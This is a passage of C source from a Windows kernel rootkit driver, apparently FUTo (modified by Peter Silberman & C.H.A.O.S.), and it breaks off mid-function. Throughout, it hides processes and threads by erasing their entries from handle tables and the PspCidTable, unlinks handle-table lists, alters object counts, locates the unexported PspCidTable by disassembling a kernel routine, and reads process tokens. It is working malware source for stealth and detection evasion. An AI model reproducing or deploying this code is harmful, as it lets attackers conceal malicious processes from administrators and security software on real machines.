			pp_tableEntry = (PPTABLE_ENTRY)((DWORD)orig_tableEntry & 0xfffffff8);
			for (a = 0; a < i_hperPage; a++)
			{
				if (pp_tableEntry[a] == NULL)
					break;

				for (b = 0; b < i_hperPage; b++)
				{
					if (((pp_tableEntry[a][b].object ^ 0x80000000) & 0xfffffff8) == ((DWORD)tarHandle - 0x18))
					{
						//DbgPrint("Handle = %x Object Header %x Security %x\n", ((a*512)+b)*4, ((pp_tableEntry[a][b].object | 0x80000000) & 0xfffffff8), pp_tableEntry[a][b].security);
						pp_tableEntry[a][b].object = 0;
						pp_tableEntry[a][b].security = 0;
					}
				}
				
			}
		}
		else if (i_numTables == 2)
		{
			//DbgPrint("Found a three level handle table.\n");
			ppp_tableEntry = (PPPTABLE_ENTRY)((DWORD)orig_tableEntry & 0xfffffff8);
			for (a = 0; a < i_hperPage; a++)
			{
				if (ppp_tableEntry[a] == NULL)
					break;

				for (b = 0; b < i_hperPage; b++)
				{
					if (ppp_tableEntry[a][b] == NULL)
						break;

					for (c = 0; c < i_hperPage; c++)
					{
						if (((ppp_tableEntry[a][b][c].object ^ 0x80000000) & 0xfffffff8) == ((DWORD)tarHandle - 0x18))
						{
							//DbgPrint("Handle = %x Object Header %x Security %x\n", ((a*512)+(b*256)+c)*4, ((ppp_tableEntry[a][b][c].object | 0x80000000) & 0xfffffff8), ppp_tableEntry[a][b][c].security);
							ppp_tableEntry[a][b][c].object = 0;
							ppp_tableEntry[a][b][c].security = 0;
						}
					}
					
				}
			}
		}
	}
	else if (b_isXP2K3 == FALSE)
	{
		i_hperPage = 256;

		//DbgPrint("Found a three level handle table.\n");
		ppp_tableEntry = (PPPTABLE_ENTRY)((DWORD)orig_tableEntry & 0xfffffff8);
		for (a = 0; a < i_hperPage; a++)
		{
			if (ppp_tableEntry[a] == NULL)
				break;

			for (b = 0; b < i_hperPage; b++)
			{
				if (ppp_tableEntry[a][b] == NULL)
					break;

				for (c = 0; c < i_hperPage; c++)
				{

					if (((ppp_tableEntry[a][b][c].object ^ 0x80000000) & 0xfffffff8) == ((DWORD)tarHandle - 0x18))
					{

						//DbgPrint("Handle = %x Object Header %x Security %x\n", ((a*512)+(b*256)+c)*4, ((ppp_tableEntry[a][b][c].object | 0x80000000) & 0xfffffff8), ppp_tableEntry[a][b][c].security);
						ppp_tableEntry[a][b][c].object = 0;
						ppp_tableEntry[a][b][c].security = 0;
					}
				}
				
			}
		}
	}
}


////////////////////////////////////////////////////////////////////
// void EraseObjectFromTable
//
//      IN PEPROCESS         address of the handle table that will 
//                           be parsed and altered.
//
//		PVOID				 address of the object to hide.
//
//      OUT
//
//		Description:         Erases the target object from the handle
//                           table if it is found.
//
//      Note:				 We do not first lock the handle table so
//                           things could get dicey
void EraseObjectFromPspCidTable(DWORD handle_table, PVOID tarHandle, enum ObjectType obj_type, DWORD pid, DWORD tid)
{
	PTABLE_ENTRY   orig_tableEntry, p_tableEntry, *pp_tableEntry, **ppp_tableEntry;
	int a, b, c;
	int i_numHandles, i_hperPage, i_numTables; 
	int i_handle;

	i_numHandles = *(int*)(handle_table + HANDLECOUNTOFFSET);
	orig_tableEntry = (PTABLE_ENTRY)*(PDWORD)(handle_table + TABLEOFFSET);
	i_numTables = ((DWORD)orig_tableEntry & 3);
	
	
	if (b_isXP2K3 == TRUE)
	{
		i_hperPage = PAGE_SIZE/sizeof(TABLE_ENTRY);	
		
		if (i_numTables == 0)
		{
			
//			DbgPrint("Found a single level handle table.\n");
			p_tableEntry = (PTABLE_ENTRY)((DWORD)orig_tableEntry & 0xfffffff8);
			for (a = 0; a < i_hperPage; a++)
			{
				if (((p_tableEntry[a].object | 0x80000000) & 0xfffffff8) == ((DWORD)tarHandle))
				{
//					DbgPrint("[%d]\n",a);
//					DbgPrint("Handle = %x Object %x Security %x\n", a*4, ((p_tableEntry[a].object | 0x80000000) & 0xfffffff8), p_tableEntry[a].security);
					
					add_index(&g_PspCidTableList, SINGLE_LEVEL,obj_type,(DWORD)tarHandle,pid,tid, a,0, 0, p_tableEntry[a].object, p_tableEntry[a].security);
				
					p_tableEntry[a].object = 0;
					p_tableEntry[a].security = ((PHANDLE_TABLE)handle_table)->FirstFree;
					((PHANDLE_TABLE)handle_table)->FirstFree = (ULONG)( (tid!=0) ? tid : pid );
				}
			}
		}
		else if (i_numTables == 1)
		{
//			DbgPrint("Found a two level handle table.\n");
			pp_tableEntry = (PPTABLE_ENTRY)((DWORD)orig_tableEntry & 0xfffffff8);
			
			for (a = 0; a < i_hperPage; a++)
			{
				if (pp_tableEntry[a] == NULL)
					break;

				for (b = 0; b < i_hperPage; b++)
				{
					//DbgPrint("Comparing %x to %x\n", ((pp_tableEntry[a][b].object | 0x80000000) & 0xfffffff8), tarHandle);
					if (((pp_tableEntry[a][b].object | 0x80000000) & 0xfffffff8) == ((DWORD)tarHandle))
					{
//						DbgPrint("[%d][%d]\n",a,b);
//						DbgPrint("Handle = %x Object %x Security %x\n", ((a*512)+b)*4, ((pp_tableEntry[a][b].object | 0x80000000) & 0xfffffff8), pp_tableEntry[a][b].security);
						add_index(&g_PspCidTableList, DOUBLE_LEVEL,obj_type,(DWORD)tarHandle, pid,tid,  a,b, 0, pp_tableEntry[a][b].object, pp_tableEntry[a][b].security);

						pp_tableEntry[a][b].object = 0;
						pp_tableEntry[a][b].security = ((PHANDLE_TABLE)handle_table)->FirstFree;
					    ((PHANDLE_TABLE)handle_table)->FirstFree = (ULONG)( (tid!=0) ? tid : pid );
					}
				}
				
			}
		}
		else if (i_numTables == 2)
		{
//			DbgPrint("Found a three level handle table.\n");
			ppp_tableEntry = (PPPTABLE_ENTRY)((DWORD)orig_tableEntry & 0xfffffff8);
			for (a = 0; a < i_hperPage; a++)
			{
				if (ppp_tableEntry[a] == NULL)
					break;

				for (b = 0; b < i_hperPage; b++)
				{
					if (ppp_tableEntry[a][b] == NULL)
						break;

					for (c = 0; c < i_hperPage; c++)
					{
						if (((ppp_tableEntry[a][b][c].object | 0x80000000) & 0xfffffff8) == ((DWORD)tarHandle))
						{
//							DbgPrint("Handle = %x Object %x Security %x\n", ((a*512)+(b*256)+c)*4, ((ppp_tableEntry[a][b][c].object | 0x80000000) & 0xfffffff8), ppp_tableEntry[a][b][c].security);
							add_index(&g_PspCidTableList, TRIPLE_LEVEL,obj_type, (DWORD)tarHandle, pid,tid,  a,b, c, ppp_tableEntry[a][b][c].object, ppp_tableEntry[a][b][c].security);

							ppp_tableEntry[a][b][c].object = 0;
							ppp_tableEntry[a][b][c].security = ((PHANDLE_TABLE)handle_table)->FirstFree;
					        ((PHANDLE_TABLE)handle_table)->FirstFree = (ULONG)( (tid!=0) ? tid : pid );
						}
					}
					
				}
			}
		}
	}
	else if (b_isXP2K3 == FALSE)
	{
		i_hperPage = 256;

//		DbgPrint("Found a three level handle table.\n");
		ppp_tableEntry = (PPPTABLE_ENTRY)((DWORD)orig_tableEntry & 0xfffffff8);
		for (a = 0; a < i_hperPage; a++)
		{
			if (ppp_tableEntry[a] == NULL)
				break;

			for (b = 0; b < i_hperPage; b++)
			{
				if (ppp_tableEntry[a][b] == NULL)
					break;

				for (c = 0; c < i_hperPage; c++)
				{

					if (((ppp_tableEntry[a][b][c].object | 0x80000000) & 0xfffffff8) == ((DWORD)tarHandle))
					{
						add_index(&g_PspCidTableList, TRIPLE_LEVEL,obj_type, (DWORD)tarHandle, pid,tid,  a,b, c, ppp_tableEntry[a][b][c].object, ppp_tableEntry[a][b][c].security);
//						DbgPrint("Handle = %x Object %x Security %x\n", ((a*512)+(b*256)+c)*4, ((ppp_tableEntry[a][b][c].object | 0x80000000) & 0xfffffff8), ppp_tableEntry[a][b][c].security);
						ppp_tableEntry[a][b][c].object = 0; 
						ppp_tableEntry[a][b][c].security = 0;
					}
				}
				
			}
		}
	}
}


////////////////////////////////////////////////////////////////////
// void UnHookHandleListEntry
//
//      IN PEPROCESS         address of the EPROCESS block to unlink
//                           from the linked list of handle tables in
//                           the kernel.
//
//      OUT
//
//		Description:         Unhooks the target EPROCESS block from the
//                           linked list of processes handle tables.
//
//      Note:				 Unhooking a process from the linked list of
//                           handle tables may prevent the process from
//                           being able to spawn a child process. A
//                           child process inherits certain handles from
//                           its parent. If the parent handle table cannot
//                           be found, the child cannot be created.
void UnHookHandleListEntry(PEPROCESS eproc)
{
	PLIST_ENTRY plist_hTable = NULL;
	plist_hTable = (PLIST_ENTRY)((*(PDWORD)((DWORD) eproc + HANDLETABLEOFFSET)) + HANDLELISTOFFSET);

	//DbgPrint("Unhooking the handle table of Process: %s\n", (DWORD)eproc+gul_ProcessNameOffset);
	*((DWORD *)plist_hTable->Blink) = (DWORD) plist_hTable->Flink;
	*((DWORD *)plist_hTable->Flink+1) = (DWORD) plist_hTable->Blink;

	//plist_hTable->Flink = (LIST_ENTRY *) &(plist_hTable->Flink); // Change the current LIST_ENTRY
	//plist_hTable->Blink = (LIST_ENTRY *) &(plist_hTable->Flink); // so we don't point to crap

}


/*
void ListProcessesByHandleTable(void)
{
   PEPROCESS eproc;
   PLIST_ENTRY start_plist, plist_hTable = NULL;
   PDWORD d_pid;

   // Get the current EPROCESS block
   eproc = PsGetCurrentProcess();
 
   plist_hTable = (PLIST_ENTRY)((*(PDWORD)((DWORD) eproc + HANDLETABLEOFFSET)) + HANDLELISTOFFSET);

   start_plist = plist_hTable;
   do
   {
      d_pid = (PDWORD)(((DWORD)plist_hTable + EPROCPIDOFFSET) - HANDLELISTOFFSET);

	  // Print the Process ID as a debug message.
	  // You could store it to compare to API calls.
	  DbgPrint("Process ID: %d\n", *d_pid);

	  // Advance
	  plist_hTable = plist_hTable->Flink;
   }while (start_plist != plist_hTable); 
}
*/


///////////////////////////////////////////////////////////////////
// DWORD FindPsLoadedModuleList
// Parameters:
//       IN  PDRIVER_OBJECT   a pointer to a kernel driver object.
//
// Returns:
//		 OUT DWORD   the address of the module structure corresponding
//                   to the driver that was passed in.
//     
// Description: This function returns the address of a module structure
//              in the linked list of module structures corresponding
//              to all the device drivers loaded on the system.
//
// Note:
DWORD FindPsLoadedModuleList (IN PDRIVER_OBJECT  DriverObject)
{
	PMODULE_ENTRY pm_current;

	if (DriverObject == NULL)
		return 0;

	pm_current = *((PMODULE_ENTRY*)((DWORD)DriverObject + 0x14));
	if (pm_current == NULL)
		return 0;
	
	return (DWORD) pm_current;
}


DWORD FindProcessToken (DWORD eproc)
{
	DWORD token;

	__asm {
		mov eax, eproc;
		add eax, TOKENOFFSET;
		mov eax, [eax];
		and eax, 0xfffffff8; // Added for XP. See definition of _EX_FAST_REF
		mov token, eax;
	}
	
	return token;
}



///////////////////////////////////////////////////////////////////
// DWORD FindProcessEPROC
// Parameters:
//       IN  INT     PID of the process to find.
//
// Returns:
//		 OUT DWORD   the address of the EPROCESS structure corresponding
//                   to the name that was passed in.
//     
// Description: This function returns the address of the EPROCESS
//              structure of the desired PID. 
//
// Note: This procedure has to walk the linked list of processes
//       looking for the desired process. It starts looking at the
//       EPROCESS of the System process. This driver assumes that
//       the driver was loaded using the Service Control Manager
//       (SCM) which calls DriverEntry in the context of the 
//       System process. The driver also assumes you will never
//       hide the System process. Again, this function is not
//       extremely safe because the Mutex that controls access
//       to the PsActiveProcessList was not used because it is
//       not exported.
DWORD FindProcessEPROC (int terminate_PID)
{
	DWORD eproc       = 0x00000000; 
	int   current_PID = 0;
	int   start_PID   = 0; 
	int   i_count     = 0;
	PLIST_ENTRY plist_active_procs;

	if (terminate_PID == 0)
		return terminate_PID;

	eproc = (DWORD) gpeproc_system;
	start_PID = *((DWORD*)(eproc+PIDOFFSET));
	current_PID = start_PID;

	while(1)
	{
		if(terminate_PID == current_PID)
			return eproc;
		else if((i_count >= 1) && (start_PID == current_PID))
		{
			return 0x00000000;
		}
		else {
			plist_active_procs = (LIST_ENTRY *) (eproc+FLINKOFFSET);
			eproc = (DWORD) plist_active_procs->Flink;
			eproc = eproc - FLINKOFFSET;
			current_PID = *((int *)(eproc+PIDOFFSET));
			i_count++;
		}
	}
}


///////////////////////////////////////////////////////////////////
// NTSTATUS SetupGlobalsByOS
// Parameters:
//       IN  VOID
// Returns:
//		 OUT NTSTATUS	 returns STATUS_SUCCESS if everything worked.
//     
// Description: SetupGlobalsByOS queries the Registry to determine
//              the major, minor, and service pack of the operating
//              system.
//
// Note:        
NTSTATUS SetupGlobalsByOS()
{
	RTL_QUERY_REGISTRY_TABLE paramTable[3];
	UNICODE_STRING ac_csdVersion;
	UNICODE_STRING ac_currentVersion;
	ANSI_STRING uc_csdVersion;
	ANSI_STRING uc_currentVersion;
	int dwMajorVersion = 0;
	int dwMinorVersion = 0;
	int spMajorVersion = 0;
	int spMinorVersion = 0;
	int i, i_numSpaces;
	NTSTATUS ntStatus;

	// Query the Registry to get the startup parameters to determine what functionality
	// is enabled.
	RtlZeroMemory(paramTable, sizeof(paramTable)); 
	RtlZeroMemory(&ac_currentVersion, sizeof(ac_currentVersion));
	RtlZeroMemory(&ac_csdVersion, sizeof(ac_csdVersion));

	paramTable[0].Flags = RTL_QUERY_REGISTRY_DIRECT; 
	paramTable[0].Name = L"CurrentVersion"; 
	paramTable[0].EntryContext = &ac_currentVersion;
	paramTable[0].DefaultType = REG_SZ; 
	paramTable[0].DefaultData = &ac_currentVersion; 
	paramTable[0].DefaultLength = sizeof(ac_currentVersion); 

	paramTable[1].Flags = RTL_QUERY_REGISTRY_DIRECT; 
	paramTable[1].Name = L"CSDVersion"; 
	paramTable[1].EntryContext = &ac_csdVersion;
	paramTable[1].DefaultType = REG_SZ; 
	paramTable[1].DefaultData = &ac_csdVersion; 
	paramTable[1].DefaultLength = sizeof(ac_csdVersion); 

	ntStatus = RtlQueryRegistryValues( RTL_REGISTRY_WINDOWS_NT,
									   NULL,
									   paramTable, 
									   NULL, NULL  );
    if(!NT_SUCCESS(ntStatus)) 
		return ntStatus;

	ntStatus = RtlUnicodeStringToAnsiString(&uc_csdVersion, &ac_csdVersion, TRUE);
    if(!NT_SUCCESS(ntStatus)) 
	{	
		// Free the UNICODE ones
		RtlFreeUnicodeString(&ac_currentVersion);
		RtlFreeUnicodeString(&ac_csdVersion);
		return ntStatus;
	}
	ntStatus = RtlUnicodeStringToAnsiString(&uc_currentVersion, &ac_currentVersion, TRUE);
    if(!NT_SUCCESS(ntStatus)) 
	{	
		// Free the UNICODE ones
		RtlFreeUnicodeString(&ac_currentVersion);
		RtlFreeUnicodeString(&ac_csdVersion);
		// Free the ANSI ones
		RtlFreeAnsiString(&uc_csdVersion);
		return ntStatus;
	}

	// Free the UNICODE ones
	RtlFreeUnicodeString(&ac_currentVersion);
	RtlFreeUnicodeString(&ac_csdVersion);

	dwMajorVersion = atoi((char *)(uc_currentVersion.Buffer));
	dwMinorVersion = atoi((char *)(uc_currentVersion.Buffer+2));

	i_numSpaces = 0;
	for (i = 0; i < uc_csdVersion.Length; i++)
	{
		if (uc_csdVersion.Buffer[i] == ' ')
			i_numSpaces += 1;
		if (i_numSpaces == 2)
		{
			spMajorVersion = atoi(uc_csdVersion.Buffer+i+1);
			i_numSpaces += 1;
		}
		if (uc_csdVersion.Buffer[i] == '.')
			spMinorVersion = atoi(uc_csdVersion.Buffer+i+1);
	}

	// Free the ANSI ones
	RtlFreeAnsiString(&uc_currentVersion);
	RtlFreeAnsiString(&uc_csdVersion);
	
	b_isXP2K3 = FALSE;
	if (dwMajorVersion == 4 && dwMinorVersion == 0)
	{
		/*fprintf(stderr, "Microsoft Windows NT 4.0 ");
		PIDOFFSET = 148;
		FLINKOFFSET = 152;
		AUTHIDOFFSET = 24;
		TOKENOFFSET = 264; 
		PRIVCOUNTOFFSET = 52;
		PRIVADDROFFSET  = 80;
		SIDCOUNTOFFSET = 48;
		SIDADDROFFSET  = 72;
		THREADOFFSET = 0x50; // ????
		THREADFLINK = 0x1a4; // ????
		HANDLETABLEOFFSET = 0x128; // ????
		HANDLECOUNTOFFSET = 0x4;   // ????
		TABLEOFFSET = 0x8;         // ????
		HANDLELISTOFFSET = 0x54;   // ????
		*/
		// Stop supporting NT 4.0
		return STATUS_UNSUCCESSFUL;
	}
	else if (dwMajorVersion == 5 && dwMinorVersion == 0)
	{
		//fprintf(stderr, "Microsoft Windows 2000 ");
		PIDOFFSET = 156;
		FLINKOFFSET = 160;
		AUTHIDOFFSET = 0x18;
		TOKENOFFSET = 0x12c; 
		PRIVCOUNTOFFSET = 0x44;
		PRIVADDROFFSET  = 0x64;
		SIDCOUNTOFFSET = 0x3c;
		SIDADDROFFSET  = 0x58;
		THREADOFFSET = 0x50;
		THREADFLINK = 0x1a4;
		HANDLETABLEOFFSET = 0x128;
		HANDLECOUNTOFFSET = 0x4;
		TABLEOFFSET = 0x8;
		HANDLELISTOFFSET = 0x54;
		EPROCPIDOFFSET = 0x010;
	}
	else if (dwMajorVersion == 5 && dwMinorVersion == 1)
	{
		//fprintf(stderr, "Microsoft Windows XP ");
		b_isXP2K3 = TRUE;

		PIDOFFSET = 132;
		FLINKOFFSET = 136;
		AUTHIDOFFSET = 24;
		TOKENOFFSET = 200; 
		PRIVCOUNTOFFSET = 72;
		PRIVADDROFFSET  = 104;
		SIDCOUNTOFFSET = 64;
		SIDADDROFFSET  = 92;
		THREADOFFSET = 0x50;
		THREADFLINK = 0x1b0; // ????
		HANDLETABLEOFFSET = 0xc4;
		HANDLECOUNTOFFSET = 0x3c;
		TABLEOFFSET = 0;
		HANDLELISTOFFSET = 0x1c;
		EPROCPIDOFFSET = 0x08;
		CIDOFFSET = 0x1ec; 
		if (spMajorVersion >= 2) //* For Service Pack 2 Beta??
		{
			PRIVCOUNTOFFSET = 84;
			PRIVADDROFFSET  = 116;
			SIDCOUNTOFFSET = 76;
			SIDADDROFFSET  = 104;
			THREADFLINK = 0x1b0;
		}
	}
	else if (dwMajorVersion == 5 && dwMinorVersion == 2)
	{
		//fprintf(stderr, "Microsoft Windows Server 2003 ");
		b_isXP2K3 = TRUE;

		PIDOFFSET = 132;
		FLINKOFFSET = 136;
		AUTHIDOFFSET = 24;
		TOKENOFFSET = 200; 
		PRIVCOUNTOFFSET = 84;
		PRIVADDROFFSET  = 116;
		SIDCOUNTOFFSET = 76;
		SIDADDROFFSET  = 104;
		THREADOFFSET = 0x50;
		THREADFLINK = 0x1b0;
		HANDLETABLEOFFSET = 0xc4;// ????
		HANDLECOUNTOFFSET = 0x3c;// ???? 
		TABLEOFFSET = 0;         // ????
		HANDLELISTOFFSET = 0x1c; // ????
		EPROCPIDOFFSET = 0x08;   // ????
	}

	return STATUS_SUCCESS;
}


///////////////////////////////////////////////////////////////////
// DWORD FindProcessEPROCByName
// Parameters:
//       IN  PCHAR   pointer to the name of the process to find.
//
// Returns:
//		 OUT DWORD   the address of the EPROCESS structure corresponding
//                   to the name that was passed in.
//     
// Description: This function returns the address of the EPROCESS
//              structure of the desired process name. 
//
// Note: This procedure has to walk the linked list of processes
//       looking for the desired process. It starts looking at the
//       EPROCESS of the System process. This driver assumes that
//       the driver was loaded using the Service Control Manager
//       (SCM) which calls DriverEntry in the context of the 
//       System process. The driver also assumes you will never
//       hide the System process. Again, this function is not
//       extremely safe because the Mutex that controls access
//       to the PsActiveProcessList was not used because it is
//       not exported.
DWORD FindProcessEPROCByName(char *p_name)
{ 
	int   current_PID = 0;
	int   start_PID   = 0; 
	int   i_count     = 0;
	int   len         = 0;
	PLIST_ENTRY plist_active_procs;
	PEPROCESS eproc   = NULL ;

	
	if (p_name == NULL)
		return 0;

	len = strlen(p_name);

	eproc = gpeproc_system;
	start_PID = *((PDWORD)((DWORD)eproc+PIDOFFSET));
	current_PID = start_PID;

	while(1)
	{
		if(_strnicmp(p_name, (PVOID)((DWORD)eproc+gul_ProcessNameOffset) ,len) == 0)
			return (DWORD)eproc;
		else if((i_count >= 1) && (start_PID == current_PID))
		{
			return 0x00000000;
		}
		else {
			plist_active_procs = (LIST_ENTRY *) ((DWORD)eproc+FLINKOFFSET);
			(DWORD)eproc = (DWORD) plist_active_procs->Flink;
			(DWORD)eproc = (DWORD) eproc - FLINKOFFSET;
			current_PID = *((PDWORD)((DWORD)eproc+PIDOFFSET));
			i_count++;
		}
	}
}


////////////////////////////////////////////////////////////////////
// void HideThreadsInTargetProcess
//
//      IN PEPROCESS         address of the EPROCESS block whose 
//                           threads need to be removed from the target
//                           processes handle table.
//
//      IN PEPROCESS         address of the EPROCESS block whose 
//                           handle table will have some of its entries
//                           erased.
//
//      OUT
//
//		Description:         Walks the handle table of the target process
//                           and erases any thread objects that need to
//                           be hidden.
//
//      Note:				 Walking any linked list without safeguards 
//                           is dangerous.
//
// Modified by: Peter Silberman & C.H.A.O.S. 
void HideThreadsInTargetProcess(PEPROCESS eproc, PEPROCESS target_eproc)
{
	PETHREAD start, walk;
	DWORD check1, check2;

	if (eproc == NULL)
		return;

	check1 = *(DWORD *)((DWORD)eproc + THREADOFFSET);
	check2 = ((DWORD)eproc + THREADOFFSET);
	// If check1 points back to the EPROCESS, there are no threads in the process.
	// It must be exiting.
	if (check1 == check2)
		return;

	start = *(PETHREAD *)((DWORD)eproc + THREADOFFSET);
	start = (PETHREAD)((DWORD)start - THREADFLINK);
	walk = start;
	do
	{
		EraseHandle(target_eproc, walk);
		walk = *(PETHREAD *)((DWORD)walk + THREADFLINK);
		walk = (PETHREAD)((DWORD)walk - THREADFLINK);
	}while (walk != start);
}


////////////////////////////////////////////////////////////////////
// void HideThreadsInPspCidTable
//
//      IN PEPROCESS         address of the EPROCESS block whose 
//                           threads need to be removed from the 
//							 PspCidTable.
//
//      OUT
//
//		Description:         Walks the list of threads of the process
//                           and erases any thread objects that need to
//                           be hidden from the PspCidTable.
//
//      Note:				 Walking any linked list without safeguards 
//                           is dangerous.
// Modified by: Peter Silberman & C.H.A.O.S. 
void HideThreadsInPspCidTable(PEPROCESS eproc)
{
	PETHREAD start, walk;
	DWORD check1, check2;

	if (eproc == NULL)
		return;

	check1 = *(DWORD *)((DWORD)eproc + THREADOFFSET);
	check2 = ((DWORD)eproc + THREADOFFSET);
	// If check1 points back to the EPROCESS, there are no threads in the process.
	// It must be exiting.
	if (check1 == check2)
		return;

//	DbgPrint("EPROC: 0x%08x\n", eproc);
	start = *(PETHREAD *)((DWORD)eproc + THREADOFFSET);
	start = (PETHREAD)((DWORD)start - THREADFLINK);
	walk = start;
	do
	{
//		DbgPrint("walk: 0x%08x\n", walk);
		EraseObjectFromPspCidTable(gcid_table, walk, ID_THREAD,*((DWORD*)((DWORD)eproc+PIDOFFSET)),	 *((DWORD*)((DWORD)walk + (CIDOFFSET + 0x04) ))	);
		walk = *(PETHREAD *)((DWORD)walk + THREADFLINK);
//		DbgPrint("walk: 0x%08x\n", walk);
		walk = (PETHREAD)((DWORD)walk - THREADFLINK);
	}while (walk != start);
}


///////////////////////////////////////////////////////////////////
// NTSTATUS FindObjectTypes
// Parameters:
//       IN  char *          name of type to search for.
//
// Returns:
//		 OUT POBJECT_TYPE	 returns a pointer to the object type 
//                           if it is found.
//     
// Description: This function walks all the object types on the system
//              and looks for certain object types. We will use this
//              information to find all objects of a certain type. 
//
// Note:        
POBJECT_TYPE FindObjectTypes(char *ac_tName)
{
    OBJECT_ATTRIBUTES ObjectAttributes;
    UNICODE_STRING ucName, ufName;
	ANSI_STRING afName;
    NTSTATUS ntStatus;
    HANDLE hDirectory = NULL;
    POBJECT_DIRECTORY pDirectoryObject = NULL;
    POBJECT_DIRECTORY_ENTRY DirectoryEntry;
	POBJECT_HEADER objHead;
    ULONG Bucket = 0;
	DWORD d_size;
	PUNICODE_STRING p_wcName;

	p_wcName = (PUNICODE_STRING) ExAllocatePool(PagedPool, sizeof(UNICODE_STRING)+(sizeof(WCHAR)*1024));
	if (p_wcName == NULL)
		return NULL;

	p_wcName->Length = 0;
	p_wcName->MaximumLength = 1022;
	p_wcName->Buffer = (PWSTR)((DWORD)p_wcName + sizeof(UNICODE_STRING));

	RtlInitAnsiString(&afName, ac_tName);
	
	// open driver directory in the object directory
    RtlInitUnicodeString(&ucName,L"\\ObjectTypes");
    InitializeObjectAttributes(&ObjectAttributes,&ucName,OBJ_CASE_INSENSITIVE,NULL,NULL);
    ntStatus = ObOpenObjectByName(&ObjectAttributes,
								  NULL,
								  KernelMode,
								  NULL,
								  0x80000000,
								  NULL,
								  &hDirectory);
    if (!NT_SUCCESS (ntStatus))
        return NULL;

    // get pointer from handle
    ntStatus = ObReferenceObjectByHandle(hDirectory,
		                                 FILE_ANY_ACCESS,
										 NULL,
										 KernelMode,
										 &pDirectoryObject,
        								 NULL);
	ZwClose (hDirectory);
    if (!NT_SUCCESS (ntStatus))
		return NULL;
    
	ntStatus = RtlAnsiStringToUnicodeString(&ufName, &afName, TRUE);
    if (!NT_SUCCESS (ntStatus))
		return NULL;
	
    // walk the object directory
    for (Bucket = 0; Bucket < NUMBER_HASH_BUCKETS; Bucket++) 
    {
        DirectoryEntry = pDirectoryObject->HashBuckets[Bucket];
		while (DirectoryEntry != NULL)
		{
			ntStatus = ObQueryNameString(DirectoryEntry->Object, 
				                         (POBJECT_NAME_INFORMATION) p_wcName, 
										 p_wcName->MaximumLength, 
										 &d_size);
			if (NT_SUCCESS (ntStatus))
			{
				if (RtlCompareUnicodeString(p_wcName, &ufName, TRUE)==0)
				{
					//DbgPrint("Object Name: %ws %x\n", p_wcName->Buffer, DirectoryEntry->Object);
					if (pDirectoryObject)
						ObDereferenceObject(pDirectoryObject);
					RtlFreeUnicodeString(&ufName);
					ExFreePool(p_wcName);
					return (POBJECT_TYPE) DirectoryEntry->Object;
				}
			}
			p_wcName->MaximumLength = 1022;
			DirectoryEntry = DirectoryEntry->ChainLink;
		}
	}

    if (pDirectoryObject)
		ObDereferenceObject(pDirectoryObject);
	RtlFreeUnicodeString(&ufName);
	ExFreePool(p_wcName);
    return NULL;
}


void DecrementObjectCount(POBJECT_TYPE p_objType)
{
	//DbgPrint("Decrementing count for object %x\n", p_objType);
	p_objType->TotalNumberOfObjects -= 1;
}



///////////////////////////////////////////////////////////////////
// DWORD GetPspCidTable
// Parameters:
//       
//
// Returns:
//		 OUT DWORD	 returns a pointer to the PspCidTable
//     
// Description: This function scans PsLookupProcessByProcessId for the push of PspCidTable
// it returns the PspCidTable value. 
//
// Note: This has to be done because PspCidTable is not exported.
// However there is a better way to do this that is more efficent, see Opc0de's getvar.
//
// Modified by: Peter Silberman & C.H.A.O.S. 
DWORD GetPspCidTable()
{
	
		BYTE* addy = 0;
		int prev_len = 0;
		int len = 0;
		INSTRUCTION inst;
		INSTRUCTION inst_prev;
		int i = 0;
		UNICODE_STRING          pslookup;		
		
		RtlInitUnicodeString (&pslookup,
                          L"PsLookupProcessByProcessId");		
		addy = (BYTE*) MmGetSystemRoutineAddress(&pslookup);
		 
		while(i <= 500)
		{
			
			len += get_instruction(&inst, (BYTE*)(addy + len), MODE_32);
//			DbgPrint("Addy: 0x%08x Len: %d Length: %d\n", (addy+len), len, inst.length);
			if(inst.type == INSTRUCTION_TYPE_CALL)
			{	
					
//					DbgPrint("Prev Address: 0x%08x:%d\n", (addy + prev_len), inst.length);
					
					get_instruction(&inst_prev, (BYTE*)(addy + prev_len), MODE_32);
					
//					DbgPrint("Prev Address: 0x%08x:%d\n", (addy + prev_len), inst_prev.length);
				
//					DbgPrint("0x%08x - %d\n", (addy + prev_len), inst_prev.length);
					
//					DbgPrint("Address: 0x%08x\n", ((addy + prev_len) - (inst_prev.length + 1)) );
					get_instruction(&inst, (BYTE*)((addy + prev_len) - (inst_prev.length + 1)), MODE_32);
/*					DbgPrint("IMM: 0x%08x\n", inst.op1.immediate );
					DbgPrint("Disp: 0x%08x\n", inst.op1.dispbytes);
					DbgPrint("DispOff: 0x%08x\n", inst.op1.dispoffset);
					DbgPrint("IMMBytes: 0x%08x\n", inst.op1.immbytes);
					DbgPrint("IMMOffset: 0x%08x\n", inst.op1.immoffset);
					DbgPrint("SectionBytes: 0x%08x\n", inst.op1.sectionbytes);
					DbgPrint("Section: 0x%08x\n", inst.op1.section);
					DbgPrint("displacement: 0x%08x\n", inst.op1.displacement);
*/					
					
					return (*(DWORD*)inst.op1.displacement);
			}
			prev_len = len;
			i++;
		}
		
		return 0;
}




///////////////////////////////////////////////////////////////////
// VOID NotifyRoutine
// Parameters:
//       IN HANDLE hParentId 	is the process ID of the parent process
//
//
//				IN HANDLE hProcessId is the processId of the process being closed or created
//
//
//				IN BOOLEAN bCreate tells us if the process is being closed or created
//
// Returns:
//		 
//     
// Description: This function is a callback that is called whenever a process is closed or created.
//
// Note: FUTo is only interested in processes that are being closed
//
// Modified by: Peter Silberman & C.H.A.O.S. 
VOID NotifyRoutine (IN HANDLE hParentId, IN HANDLE ProcessId, IN BOOLEAN bCreate)
{

	PspCidTableList * p;
	PTABLE_ENTRY   orig_tableEntry, p_tableEntry, *pp_tableEntry, **ppp_tableEntry;
	
	orig_tableEntry = (PTABLE_ENTRY)*(PDWORD)(gcid_table + TABLEOFFSET);
	
	if(!bCreate)
	{
		
//		DbgPrint ("Terminated == Process Id: %d:0x%08x\n ", PId,PId);
		//
		// If it is a PID we care about restore the CID table
		//

			p = GetPspCidTableHead(g_PspCidTableList);
			if(p == NULL)
				return;
			if(p->level == SINGLE_LEVEL)
			{
				p_tableEntry = (PTABLE_ENTRY)((DWORD)orig_tableEntry & 0xfffffff8);
				while(p != NULL)
				{
					if((DWORD)p->ProcessId == (DWORD)ProcessId)
					{
//						DbgPrint("Restoring table of %d because it is being terminated\n", p->ProcessId);
						p_tableEntry[p->x].object = p->object;
						p_tableEntry[p->x].security = p->security;
					}
					p = p->pNext;
				}			
			}
			else if(p->level == DOUBLE_LEVEL)
			{
